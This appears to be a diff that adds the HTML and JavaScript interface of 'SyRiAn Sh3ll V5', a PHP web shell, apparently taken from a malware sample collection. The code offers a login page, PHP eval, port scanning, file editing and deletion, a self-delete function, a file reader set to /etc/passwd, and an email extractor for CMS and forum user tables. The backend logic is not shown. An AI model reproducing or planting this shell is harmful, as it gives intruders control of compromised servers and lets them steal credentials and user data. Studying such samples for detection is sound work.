@@ -1,0 +1,194 @@
+?>
+	<html dir=rtl>
+	<head>
+	<title>SyRiAn Sh3ll ~ V5~ [ B3 Cr34T!V3 Or D!3 TRy!nG ]</title>
+	<link rel="shortcut icon" href='http://syrian-shell.com/title.gif' />
+	<meta http-equiv=Content-Type content=text/html; charset=windows-1256>
+	<style>
+	BODY
+	{
+		FONT-FAMILY: Verdana; 
+		margin: 2;
+		color: #cccccc;
+		background-color: #000000;
+	}
+	sy  
+	{
+		color:#990000;
+		font-size:7pt;
+		font-weight: bold;
+	}
+	#Box
+	{
+	color:#990000;
+	font-size:14px;
+	background-color:#000;
+	font-weight:bold;
+	}
+	tr 
+	{
+	BORDER-RIGHT:  #cccccc 1px solid;
+	BORDER-TOP:    #cccccc 1px solid;
+	BORDER-LEFT:   #cccccc 1px solid;
+	BORDER-BOTTOM: #cccccc 1px solid;
+	color: #ffffff;
+	}
+	td 
+	{
+	BORDER-RIGHT:  #cccccc 1px solid;
+	BORDER-TOP:    #cccccc 1px solid;
+	BORDER-LEFT:   #cccccc 1px solid;
+	BORDER-BOTTOM: #cccccc 1px solid;
+	color: #cccccc;
+	}
+	.table1 
+	{
+	BORDER: 1px none;
+	BACKGROUND-COLOR: #000000;
+	color: #333333
+	}
+	.td1 
+	{
+	BORDER: 1px none;
+	color: #ffffff; font-style:normal; 
+	font-variant:normal;
+	font-weight:normal;
+	font-size:7pt;
+	font-family:tahoma
+	}
+	.tr1 
+	{
+	BORDER: 1px none;
+	color: #cccccc;
+	}
+	table 
+	{
+	BORDER:  #eeeeee  outset;
+	BACKGROUND-COLOR: #000000;
+	color: #cccccc;
+	}
+	input 
+	{
+	BORDER-RIGHT:  #990000 1px solid;
+	BORDER-TOP:    #990000 1px solid;
+	BORDER-LEFT:   #990000 1px solid;
+	BORDER-BOTTOM: #990000 1px solid;
+	BACKGROUND-COLOR: #333333;
+	font: 9pt tahoma;
+	color: #ffffff;
+	}
+	select 
+	{
+	BORDER-RIGHT:  #ffffff 1px solid;
+	BORDER-TOP:    #999999 1px solid;
+	BORDER-LEFT:   #999999 1px solid;
+	BORDER-BOTTOM: #ffffff 1px solid;
+	BACKGROUND-COLOR: #000000;
+	font: 9pt tahoma;
+	color: #CCCCCC;;
+	}
+	submit 
+	{
+	BORDER:  1px outset buttonhighlight;
+	BACKGROUND-COLOR: #272727;
+	width: 40%;
+	color: #cccccc;
+	}
+	textarea 
+	{
+	BORDER-RIGHT:  #ffffff 1px solid;
+	BORDER-TOP:    #999999 1px solid;
+	BORDER-LEFT:   #999999 1px solid;
+	BORDER-BOTTOM: #ffffff 1px solid;
+	BACKGROUND-COLOR: #333333;
+	color: #ffffff;
+	}
+	A:link {COLOR:#990000; TEXT-DECORATION: none}
+	A:visited { COLOR:#990000; TEXT-DECORATION: none}
+	A:active {COLOR:#990000; TEXT-DECORATION: none}
+	A:hover {color:blue;TEXT-DECORATION: none}
+	</style>
+	<script>
+	function ins(text)
+	{
+		document.nst.chars.value+=text;
+		document.nst.chars.focus();
+	}
+	function Suicide()
+	{
+		var confirmSuicide = confirm('Are You Sure You Wanna Delete the sh3ll ?');
+		if(confirmSuicide == true){document.location='main.php?id=Delete';}
+		else{document.location='main.php';}}
+		function Blur(id , defalutText)
+		{
+			var currentData = document.getElementById(id).value;
+			if( currentData == ''){document.getElementById(id).value = defalutText;}
+		}
+		function Clear(id , defalutText)
+		{if( document.getElementById(id).value == defalutText){document.getElementById(id).value = '';}}	
+		function ScriptsType()
+		{
+			if(document.getElementById('ScriptType').value == 'vb')
+			{document.getElementById('Prefix').value = '';}
+			else if(document.getElementById('ScriptType').value == 'wp')
+			{document.getElementById('Prefix').value = 'wp_';}
+			else if(document.getElementById('ScriptType').value == 'jos')
+			{document.getElementById('Prefix').value = 'jos_';}
+			else if(document.getElementById('ScriptType').value == 'phpbb')
+			{document.getElementById('Prefix').value = 'phpbb_';}
+			else if(document.getElementById('ScriptType').value == 'ipb')
+			{document.getElementById('Prefix').value = 'ipb_';}
+			else if(document.getElementById('ScriptType').value == 'mybb')
+			{document.getElementById('Prefix').value = 'mybb_';}
+			else if(document.getElementById('ScriptType').value == 'smf')
+			{document.getElementById('Prefix').value = 'smf_';}
+		}
+		function evalOrEnc2()
+		{
+			if(document.getElementById('evalOrEnc').value == 'eval')
+			{document.getElementById('php_eval').value = '<?php echo "SyRiAn_Sh3ll V5"; ?>';}
+			else if(document.getElementById('evalOrEnc').value == 'enc')
+			{document.getElementById('php_eval').value = 'my String To Encrypt';}	
+			else if(document.getElementById('evalOrEnc').value == 'analyze')
+			{document.getElementById('php_eval').value = 'c4ca4238a0b923820dcc509a6f75849b';}
+			else if(document.getElementById('evalOrEnc').value == 'scan')
+			{document.getElementById('php_eval').value = '127.0.0.1';}	
+			else if(document.getElementById('evalOrEnc').value == 'genServ')
+			{document.getElementById('php_eval').value = '/home/cj/MALMAX/malmax-shipped/malmax-shipped/samples/obfuscated/4';}	
+		}
+		function ChangeInputs()
+		{
+			if(document.getElementById('actionType').value == 'rename')
+			{document.getElementById('newName').innerHTML = '<input type="text" name="newName" value="newName.txt" size="25" /> ';	}
+			else if (document.getElementById('actionType').value == 'copy')
+			{document.getElementById('newName').innerHTML = '<input type="text" name="newName" value="CopyName.txt" size="25" /> ';	}
+			else if (document.getElementById('actionType').value == 'createFile')
+			{document.getElementById('newName').innerHTML = '<input type="text" name="newName" value="File Content" size="25" /> ';	}
+			else{document.getElementById('newName').innerHTML = '';}
+			
+			if(document.getElementById('actionType').value == 'deleteFolder' || document.getElementById('actionType').value == 'createFolder')
+			{document.getElementById('editFile').value = "folderName";}
+			else{document.getElementById('editFile').value = "index.txt";}
+		}
+		function ChangeSQLType()
+		{
+			if(document.getElementById('SQLType').value == 'SQLQuery')
+			{document.getElementById('inputType').innerHTML = '<textarea name=\'QU\'  rows=\'4\' cols=\'44\'>SELECT * FROM emp ;</textarea>';}
+			else if (document.getElementById('SQLType').value == 'SQLReader')
+			{document.getElementById('inputType').innerHTML = '<input type=\'text\' value=\'/etc/passwd\' name=\'file\' size=\'70\'><br/>';}	
+			else if (document.getElementById('SQLType').value == 'EmailExtractor')
+			{document.getElementById('inputType').innerHTML = '<input type =\'text\' name=\'EM_TABLE\' value=\'users Table\' />  <input type =\'text\' name=\'EM_COLUMN\' value=\'emails Column\' />  <input type=\'submit\' value=\'?\' name=\'emailExtractorHelp\'  alt=\'Email Extractor Help\'/><br/>';}
+		}
+	</script>
+	</head><script>window.location = '?id=mainPage';</script>
+			<body bgcolor="black"><br><br>
+			<center><font color=#990000 size=5><b>SyRi</b></font><font color=green size=5><b>An Sh</b></font><font color=gray size=5><b>3ll <font color="red">V5</font></b></font><br>
+
+			<img src="http://www.syrian-shell.com/eagle.jpg">
+			</center>
+			<div align="center">
+			<form method="POST" onsubmit="if(this.usrname.value==''){return false;}">
+			<input dir="ltr" name="usrname" id="username" value="userName" type="text"  size="30" onblur="Blur('username','userName');" onclick="Clear('username','userName');"/><br>
+			<input dir="ltr" name="passwrd" id="password" value="" type="password" size="30" onfocus="Focus(2);" /><br>
+			<input type="submit" value=" Login  " name="login" />
+			</form></p>
